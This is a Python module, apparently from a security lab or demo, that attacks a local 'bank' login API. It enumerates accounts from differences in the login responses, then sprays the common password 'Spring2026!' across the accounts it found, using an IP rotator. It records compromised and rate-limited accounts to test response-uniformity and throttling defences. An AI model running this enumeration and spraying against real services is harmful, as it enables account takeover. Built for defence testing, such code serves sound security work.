"""R3 공격: 계정 열거(정찰) → 크리덴셜 스프레이(살포).

- 정찰: /api/v1/login에 후보 아이디 + 맞을 리 없는 비번을 넣고, 응답 차이로 실제 계정을 가려낸다.
  bank가 R3로 응답(상태·문구)을 균일화하면 차이가 없어 아무 것도 못 가린다(= 정찰 무력화).
- 살포: 가려낸(없으면 후보 전체) 계정에 흔한 비밀번호 하나를 1회씩 시도한다.

실제 공격 수행 코드다. config의 안전장치로 로컬 gateway만 때린다.
LLM 없이 정해진 순서로 움직이므로 재생 없이도 매번 같은 장면이 나온다.
"""
import httpx

from app.config import AGENT_TARGET, REQUEST_TIMEOUT_SECONDS, assert_target_is_safe
from app.recorder import Recorder
from app.tools import IPRotator, http_get, http_post

LOGIN = "/api/v1/login"
PROBE_PASSWORD = "__probe__"      # 정찰용. 맞을 리 없는 값
SPRAY_PASSWORD = "Spring2026!"    # 살포용. 흔한 비밀번호 하나

# 실재 계정과 미실재 후보를 섞는다. 응답이 갈리면 실재 계정이 드러난다(R3면 안 갈림).
CANDIDATE_USERNAMES = [
    "admin", "kim.j", "lee.s", "park.h", "choi.m",
    "test.1", "guest", "manager", "no.such", "ghost",
]


def _signature(outcome) -> tuple:
    # 계정 존재 여부가 드러날 수 있는 채널: 상태코드 + 응답 본문
    return (outcome.http_status, outcome.response_text)


def enumerate_existing(signatures: dict[tuple, list[str]]) -> list[str]:
    """응답이 둘 이상으로 갈리면 소수파(= 다르게 반응한 계정)를 '존재'로 추정한다.
    전부 같은 응답이면(R3 균일화) 가려낼 수 없어 빈 목록."""
    if len(signatures) < 2:
        return []
    smallest = min(signatures.values(), key=len)
    return sorted(smallest)


def run_recon_spray() -> dict:
    assert_target_is_safe()
    recorder = Recorder()
    recorder.write_meta(mode="recon_spray", target=AGENT_TARGET)
    ip = IPRotator()
    signatures: dict[tuple, list[str]] = {}
    stolen: list[str] = []
    blocked = 0

    with httpx.Client(base_url=AGENT_TARGET, timeout=REQUEST_TIMEOUT_SECONDS) as c:
        # 1) 정찰: 응답 차이로 실제 계정 열거 시도
        for username in CANDIDATE_USERNAMES:
            out = http_post(c, ip, LOGIN, f"정찰: {username} 계정이 있는지 로그인 응답 차이로 확인",
                            body={"username": username, "password": PROBE_PASSWORD})
            recorder.write_outcome(out)
            # 429(차단)는 계정 존재 신호가 아니라 R1·R2가 막은 것이니 열거 판정에서 뺀다.
            # 실제 로그인 판정 응답(보통 401)만 비교해야 "응답 균일화(R3)" 여부가 드러난다.
            if out.http_status is not None and out.http_status != 429:
                signatures.setdefault(_signature(out), []).append(username)

        discovered = enumerate_existing(signatures)

        # 2) 살포: 가려낸 계정(없으면 후보 전체)에 흔한 비번 1회씩
        for username in discovered or CANDIDATE_USERNAMES:
            out = http_post(c, ip, LOGIN, f"살포: {username}에 흔한 비밀번호 1회",
                            body={"username": username, "password": SPRAY_PASSWORD})
            recorder.write_outcome(out)
            if out.http_status == 200:
                stolen.append(username)
            elif out.http_status == 429:
                blocked += 1

        recorder.write_outcome(http_get(c, ip, "/", "__END__"))

    recorder.write_end(
        summary=f"정찰 {len(CANDIDATE_USERNAMES)}건 · 열거 추정 {discovered} · 탈취 {stolen} · 차단 {blocked}건")
    return {"run_id": recorder.run_id, "enumerated": discovered, "stolen": stolen, "blocked": blocked}
